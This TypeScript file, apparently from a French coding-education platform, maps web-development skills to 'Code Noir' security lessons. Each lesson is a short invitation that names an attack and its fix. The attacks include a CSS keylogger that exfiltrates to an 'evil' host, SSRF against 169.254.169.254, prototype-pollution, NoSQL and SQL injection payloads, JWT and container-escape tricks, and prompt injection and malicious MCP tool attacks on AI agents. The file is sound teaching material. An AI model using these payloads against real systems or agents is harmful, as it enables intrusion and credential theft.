/**
 * Mapping skill (M01-M25) → technique Code Noir à attaquer après maîtrise.
 *
 * Quand l’apprenant maîtrise un skill listé en clé, le lesson player lui
 * propose la technique correspondante au Code Noir (déjà unlocked au niveau
 * du module, mais qui devient *pertinente* maintenant).
 *
 * Mapping côté frontend (pas en DB), suffisant tant que les techniques
 * restent statiques.
 */
export type CodeNoirSkillLink = {
  /** Slug de la technique dans CODE_NOIR_TECHNIQUES (backend) */
  techniqueSlug: string;
  /** Titre affiché */
  techniqueTitle: string;
  /** "duo" | "offensive" | "defensive" */
  kind: "offensive" | "defensive" | "duo";
  /** Phrase d’invitation contextuelle (pédagogique) */
  invitation: string;
};

/** Indexé par skill slug (unique cross-module dans le seed). */
export const CODE_NOIR_BY_SKILL: Record<string, CodeNoirSkillLink> = {
  "http-anatomy": {
    techniqueSlug: "host-header-injection",
    techniqueTitle: "Host Header Poisoning",
    kind: "duo",
    invitation:
      "Tu sais lire une requête HTTP brute ? Tu peux attaquer une faille où le serveur fait confiance au header Host envoyé par le client (reset password vers evil.com).",
  },

  "dns-resolution": {
    techniqueSlug: "dns-rebinding",
    techniqueTitle: "DNS Rebinding",
    kind: "offensive",
    invitation:
      "TTL court + Same-Origin Policy = tu peux faire frapper le routeur local d’une victime depuis ton domaine. Attaque culte sur les services internes.",
  },

  "http-versions": {
    techniqueSlug: "http-smuggling",
    techniqueTitle: "HTTP Request Smuggling (CL.TE / TE.CL)",
    kind: "duo",
    invitation:
      "HTTP/1.1 et le désaccord entre proxy frontend et backend → tu injectes une 2e requête préfixée à celle de la victime suivante. Le bug bounty à 5 chiffres préféré de James Kettle.",
  },

  "scripting": {
    techniqueSlug: "command-injection",
    techniqueTitle: "OS Command Injection (shell)",
    kind: "duo",
    invitation:
      "Tu écris des scripts qui prennent de l’input ? Vois comment un point-virgule ou un $(...) dans un argument fait exécuter au serveur une commande arbitraire — et la seule vraie parade (execFile + tableau d’args, jamais le shell).",
  },

  "remove-secrets": {
    techniqueSlug: "git-secrets-leak",
    techniqueTitle: "Secrets dans l’historique Git",
    kind: "duo",
    invitation:
      "Tu sais effacer un secret de l’historique ? Découvre pourquoi ça ne suffit JAMAIS : les bots minent GitHub en temps réel (trufflehog/gitleaks) et une clé poussée est compromise en minutes. La rotation est le seul fix.",
  },

  "lockfile": {
    techniqueSlug: "supply-chain",
    techniqueTitle: "Supply Chain Attacks (npm/pip)",
    kind: "duo",
    invitation:
      "Tu commits ton lockfile à chaque fois ? Vois pourquoi ça ne suffit pas : typosquatting, account takeover de mainteneur, confused dependency — un `postinstall` malveillant exfiltre ton .env avant même que tu lances l'app. La parade : --frozen-lockfile + ignore-scripts + Socket.dev.",
  },

  "forms": {
    techniqueSlug: "clickjacking",
    techniqueTitle: "Clickjacking + UI Redress",
    kind: "duo",
    invitation:
      "Tu sais construire des formulaires et des boutons d'action ? Découvre comment une iframe transparente du site cible fait cliquer la victime sur ton 'Delete account' pendant qu'elle croit gagner un iPhone. Seul vrai fix : frame-ancestors en CSP.",
  },

  "selectors": {
    techniqueSlug: "css-keylogger",
    techniqueTitle: "CSS Keylogger via attribute selectors",
    kind: "offensive",
    invitation:
      "Tu maîtrises les sélecteurs d'attribut CSS ? Détourne-les : `input[value^=\"a\"]{background:url(evil/log?c=a)}` × 36 = un keylogger qui exfiltre chaque frappe sans une ligne de JS.",
  },

  "design-system": {
    techniqueSlug: "css-injection-exfil",
    techniqueTitle: "CSS Injection — exfiltration scriptless",
    kind: "duo",
    invitation:
      "Tu injectes du CSS dynamique (thèmes, variables) ? Vois la classe ultime du scriptless : @import récursif + sélecteurs de préfixe + @font-face unicode-range pour voler un token CSRF caractère par caractère, sans JS. La technique de Gareth Heyes.",
  },

  "coercion": {
    techniqueSlug: "type-coercion-bypass",
    techniqueTitle: "Type Coercion & Timing Attacks",
    kind: "duo",
    invitation:
      "Tu sais pourquoi on écrit toujours `===` ? Vois ce que `==` fait sauter : `password == ADMIN_PASSWORD` bypassé avec `[]` ou `' '`, et l'attaque timing qui extrait un token via `===` char par char. Fix : crypto.timingSafeEqual.",
  },

  "content-modification": {
    techniqueSlug: "xss-deep",
    techniqueTitle: "XSS — Reflected, Stored, DOM, Mutation",
    kind: "duo",
    invitation:
      "Tu connais la différence textContent vs innerHTML ? C'est exactement la frontière de l'XSS : reflected, stored, DOM-based et mutation XSS, chacune avec son vecteur et son bypass de DOMPurify. La faille web n°1.",
  },

  "events": {
    techniqueSlug: "postmessage-attack",
    techniqueTitle: "postMessage Origin Skip",
    kind: "duo",
    invitation:
      "Tu poses des addEventListener ? Un handler `message` cross-window sans check d'origin = RCE client : depuis evil.com tu postMessage du code que la cible eval. Et le `e.origin.includes('target.com')` se bypasse avec `target.com.evil.com`.",
  },

  "spread": {
    techniqueSlug: "unsafe-parsing-mass-assign",
    techniqueTitle: "Désérialisation & mass-assignment ES6+",
    kind: "duo",
    invitation:
      "Tu adores `{ ...current, ...req.body }` ? C'est un mass-assignment béant : l'attaquant envoie `{\"role\":\"admin\",\"credits\":999999}` et le spread écrase tes champs sensibles. Même piège avec un reviver JSON.parse et un import() dynamique. Parade : Zod .strict().",
  },

  "fetch": {
    techniqueSlug: "ssrf-deep",
    techniqueTitle: "SSRF — Server-Side Request Forgery",
    kind: "duo",
    invitation:
      "Tu fais des fetch côté serveur ? Si l'URL vient du user, c'est SSRF : tu frappes Redis localhost, l'Elasticsearch interne et surtout 169.254.169.254 → les clés IAM AWS dans la nature (cf. Capital One). Bypass de filtres en IP décimale/hex incluse.",
  },

  "fetch-post": {
    techniqueSlug: "cors-misconfig",
    techniqueTitle: "CORS Misconfiguration → Credential Theft",
    kind: "duo",
    invitation:
      "Tu envoies des requêtes authentifiées (credentials) ? Vois ce qu'un Access-Control-Allow-Origin reflété + credentials:true permet : depuis evil.com tu lis la réponse /api/me de la victime cross-origin. Whitelist stricte, jamais le reflect.",
  },

  "event-loop": {
    techniqueSlug: "race-condition-api",
    techniqueTitle: "Race Conditions / TOCTOU",
    kind: "offensive",
    invitation:
      "Tu comprends l'event loop et l'async ? Exploite la fenêtre entre un check et un update : 50 requêtes parallèles dans le trou TOCTOU → un coupon 'usable 1 fois' appliqué 50 fois. Single-packet attack pour une fenêtre <1ms. Fix : SELECT FOR UPDATE.",
  },

  "prototypes": {
    techniqueSlug: "prototype-pollution",
    techniqueTitle: "Prototype Pollution",
    kind: "duo",
    invitation:
      "Tu maîtrises la chaîne de prototypes JS ? Retourne-la en arme : un merge récursif mal codé + `{\"__proto__\":{\"isAdmin\":true}}` pollue Object.prototype → TOUS les objets de la VM héritent de isAdmin. RCE possible via ejs/pug. Object.create(null).",
  },

  "read-libs": {
    techniqueSlug: "deserialization-js",
    techniqueTitle: "Deserialization & gadget chains",
    kind: "duo",
    invitation:
      "Tu sais lire le code d'une lib npm ? Apprends à repérer celles qui désérialisent via eval/Function : node-serialize (CVE-2017-5941) exécute le payload à unserialize(). Audite tes deps avant de leur confier de l'input.",
  },

  "es2022": {
    techniqueSlug: "proxy-trap-abuse",
    techniqueTitle: "Proxy traps & Symbol.toPrimitive abuse",
    kind: "offensive",
    invitation:
      "Tu joues avec les features avancées d'objets JS ? Un Proxy avec un trap `get` qui renvoie 'admin' sur `role` fait passer `isAdmin(evilProxy)` à true. Symbol.toPrimitive détourne aussi les comparaisons. Bypass de logique pure.",
  },

  "lib-types": {
    techniqueSlug: "redos",
    techniqueTitle: "ReDoS (Regular Expression DoS)",
    kind: "duo",
    invitation:
      "Tu manipules des regex et leurs libs ? Un pattern à quantificateurs imbriqués `(a+)+$` + un input piégé = backtracking exponentiel qui fige l'event loop 30s (cf. l'outage Cloudflare 2019). Audit safe-regex, ou passe à re2 non-backtracking.",
  },

  "any-unknown-never": {
    techniqueSlug: "type-confusion-runtime",
    techniqueTitle: "TypeScript ≠ Runtime — Validation manquante",
    kind: "defensive",
    invitation:
      "Tu sais que `as User` n'est qu'un cast compile-time ? Prouve-le : `await req.json() as User` ne valide RIEN à runtime → l'attaquant envoie `{\"role\":\"admin\"}` et fait du mass assignment. La seule barrière réelle : Zod à la frontière.",
  },

  "jsx": {
    techniqueSlug: "react-xss",
    techniqueTitle: "React XSS — où il sort de sa protection",
    kind: "duo",
    invitation:
      "React échappe par défaut, mais tu connais les 3 trous ? dangerouslySetInnerHTML, `href={\"javascript:...\"}` et `ref={el=>el.innerHTML=...}` rouvrent grand l'XSS. DOMPurify + validation du protocole des liens.",
  },

  "tanstack-query": {
    techniqueSlug: "ssr-injection",
    techniqueTitle: "Server-Side Render Injection",
    kind: "duo",
    invitation:
      "Tu hydrates de l'état serveur côté client ? Un `window.__INITIAL_STATE__=${JSON.stringify(state)}` est piégeable : JSON.stringify échappe les guillemets mais PAS `</script>` → le navigateur ferme le tag et exécute l'injection. Échappe `<`,`>`,`&` en \\u.",
  },

  "tanstack-router": {
    techniqueSlug: "next-ssrf",
    techniqueTitle: "Next.js Route Handler SSRF + Open Redirect",
    kind: "duo",
    invitation:
      "Tu lis les params et search params d'une route ? Un handler `/api/proxy?url=...` ou un redirect `?next=...` naïf = SSRF + open redirect instantanés. Allowlist d'hôtes pour le proxy, redirects relatifs uniquement.",
  },

  "path": {
    techniqueSlug: "path-traversal-zip-slip",
    techniqueTitle: "Path Traversal & Zip Slip",
    kind: "duo",
    invitation:
      "Tu maîtrises node:path ? Vois le piège : `path.resolve(base, '/etc/passwd')` écrase la base, et `../../../` en lecture/écriture mène à un RCE (écraser une route .js) ou un Zip Slip via le nom d'entrée d'une archive. Parade : resolve PUIS vérifier le préfixe.",
  },

  "schemas-zod": {
    techniqueSlug: "validation-bypass",
    techniqueTitle: "Validation à la frontière (Zod + Fastify)",
    kind: "defensive",
    invitation:
      "Tu valides body/params/query en Zod ? Vois tout ce qui passe sans `.strict()` : mass assignment (`role:admin`), NoSQL injection, prototype pollution, DoS par payload de 100MB. La validation à la frontière est ta défense centrale.",
  },

  "routing": {
    techniqueSlug: "nosql-injection",
    techniqueTitle: "NoSQL Injection",
    kind: "duo",
    invitation:
      "Tu passes req.body dans tes handlers de route ? Si tu le files direct à une query, l'attaquant envoie un opérateur : `{\"password\":{\"$ne\":\"\"}}` matche tout → bypass d'auth. `z.string()` rejette les objets, jamais req.body brut dans une requête.",
  },

  "core-plugins": {
    techniqueSlug: "websocket-attacks",
    techniqueTitle: "WebSocket Origin Spoofing + CSWSH",
    kind: "duo",
    invitation:
      "Tu branches le plugin WebSocket Fastify ? Sans check d'Origin à l'upgrade, c'est du Cross-Site WebSocket Hijacking : depuis evil.com une WS vers ta cible embarque les cookies de la victime et lit tous ses messages. Valide l'Origin + token CSRF dans le 1er message.",
  },

  "query-builder": {
    techniqueSlug: "drizzle-sql-raw-injection",
    techniqueTitle: "Drizzle ORM — SQL injection via sql.raw()",
    kind: "duo",
    invitation:
      "Tu maîtrises le query builder typé Drizzle ? Vois pourquoi 'j'utilise un ORM donc je suis safe' est faux : dès que tu sors avec sql.raw() ou de la concaténation (souvent sur ORDER BY), la SQLi revient. Le template tag sql`...` paramétrise, sql.raw() jamais.",
  },

  "explain": {
    techniqueSlug: "sqli-full",
    techniqueTitle: "SQL Injection (union, blind, time-based) + sqlmap",
    kind: "duo",
    invitation:
      "Tu sais lire un plan d'exécution SQL ? Apprends à le détourner : UNION-based, boolean/time-based blind (`AND IF(...,SLEEP(5),0)`), exfil OOB, et l'automatisation sqlmap avec bypass WAF. Seule parade : requêtes préparées, jamais sql.raw().",
  },

  "jwt": {
    techniqueSlug: "jwt-attacks",
    techniqueTitle: "JWT — toutes les attaques",
    kind: "duo",
    invitation:
      "Tu connais la structure d'un JWT et le piège alg:none ? Vois la suite complète : key confusion RS256→HS256 (signer avec la clé publique), kid path traversal vers /dev/null, et crack du secret HMAC faible au hashcat. Hardcode l'algorithm à la vérif.",
  },

  "csrf": {
    techniqueSlug: "session-fixation",
    techniqueTitle: "Session Fixation + CSRF",
    kind: "duo",
    invitation:
      "Tu protèges contre le CSRF avec SameSite ? Complète le tableau : la session fixation force la victime à utiliser un session ID que tu connais déjà (pas de rotation au login). Rotation du session ID au login + token synchronizer + re-auth sur actions sensibles.",
  },

  "anti-patterns": {
    techniqueSlug: "ci-test-supply-chain",
    techniqueTitle: "La suite de tests comme surface d'attaque (CI/CD)",
    kind: "duo",
    invitation:
      "Tu écris des workflows GitHub Actions ? Ton test runner est un interpréteur de code arbitraire avec accès aux secrets : `pull_request_target` qui checkout le fork, postinstall malveillant, secrets dans les logs, snapshot poisoning. Ne jamais exécuter le code d'un fork avec tes secrets.",
  },

  "dockerfile": {
    techniqueSlug: "docker-escape",
    techniqueTitle: "Container Escape & Secrets Leak",
    kind: "duo",
    invitation:
      "Tu écris des Dockerfiles ? Vois comment on en sort : docker.sock monté = root sur le host, --privileged = accès disque, et `docker history` recrache tout ARG/ENV secret dans les layers. USER non-root, --cap-drop=ALL, secrets via BuildKit.",
  },

  "paas": {
    techniqueSlug: "cloud-imds-ssrf",
    techniqueTitle: "Cloud Metadata Service Attack (AWS / GCP / Azure)",
    kind: "duo",
    invitation:
      "Tu déploies sur des PaaS/cloud ? Une SSRF vers 169.254.169.254 (IMDS) crache les credentials IAM temporaires → toute action que le role peut faire (cf. Capital One, 106M de records). Force IMDSv2 + hop limit 1 + block egress vers le metadata endpoint.",
  },

  "gltf-workflow": {
    techniqueSlug: "three-js-malicious-assets",
    techniqueTitle: "Three.js / R3F — Assets 3D malveillants",
    kind: "duo",
    invitation:
      "Tu charges des .glb/.gltf via gltfjsx ? Un modèle uploadé par un user devient un vecteur : XSS via les champs `name`/`generator` réinjectés en innerHTML, bombe de décompression Draco (OOM), shader hostile qui fige le GPU. Sanitize les métadonnées + bornes avant décodage.",
  },

  "io-csv-json": {
    techniqueSlug: "python-unsafe-deserialization",
    techniqueTitle: "Python — désérialisation non sûre (pickle / yaml.load / eval)",
    kind: "duo",
    invitation:
      "Tu lis/parses des fichiers et de la donnée en Python ? Trois portes vers la RCE immédiate : pickle.loads (pickle est un format de programme, pas de données), yaml.load sans SafeLoader, et eval/exec sur input user. JSON + Pydantic, safe_load, jamais eval.",
  },

  "xml-prompts": {
    techniqueSlug: "prompt-injection",
    techniqueTitle: "Prompt Injection — Direct, Indirect, Multi-modal",
    kind: "duo",
    invitation:
      "Tu structures tes prompts en balises XML façon Anthropic ? C'est justement le cœur de la défense : direct, indirect (via RAG, instruction cachée dans un doc retrieved) et multi-modal, le LLM ne distingue pas data de prompt. Sépare strictement les sources + approval gates sur les actions.",
  },

  "mcp": {
    techniqueSlug: "agent-attacks",
    techniqueTitle: "Agent attacks — Tool Injection, Recursive Prompt, Context Bleed",
    kind: "duo",
    invitation:
      "Tu branches des serveurs MCP sur ton agent ? Plus il est autonome, plus la surface grandit : un MCP malveillant expose un tool `search` qui exfiltre, l'output d'un tool devient un prompt injecté, le contexte d'un user fuit à l'autre. Whitelist MCP signés + sandbox + human-in-the-loop.",
  },

};

/** Helper : retourne le lien Code Noir d’un skill, ou null. */
export function getCodeNoirLink(skillSlug: string): CodeNoirSkillLink | null {
  return CODE_NOIR_BY_SKILL[skillSlug] ?? null;
}
